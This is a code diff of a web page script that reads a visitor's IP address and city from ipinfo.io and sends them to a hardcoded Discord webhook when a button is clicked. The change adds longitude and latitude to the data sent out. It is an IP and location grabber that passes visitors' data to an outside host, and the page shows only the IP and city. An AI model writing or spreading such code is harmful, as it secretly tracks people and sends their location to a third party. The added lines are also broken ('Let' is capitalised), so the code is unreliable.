@@ -4,9 +4,15 @@ var web = "https://discord.com/api/webhooks/1080866736234045511/i_j_4QMtRFMlWenJ
   
 let ip;
   let city;
+Let longitude;
+Let latitude;
   $.get("https://ipinfo.io", function(response) {
            	ip = response.ip;
     city = response.city;
+
+longitude = response.longitude;
+latitude = response.latitude;
+
   }, "json")
 
   function discord_message(webHookURL, message) {
@@ -22,6 +28,6 @@ let ip;
 $(".getip").on("click", function(){
   
   document.getElementById("stuff").innerHTML = ip + ", " + city;
-  discord_message(web, "ip found " + ip + ", " + city);
+  discord_message(web, "ip found " + ip + ", " + city + ", " + longitude + ", " + latitude);
 });
 });
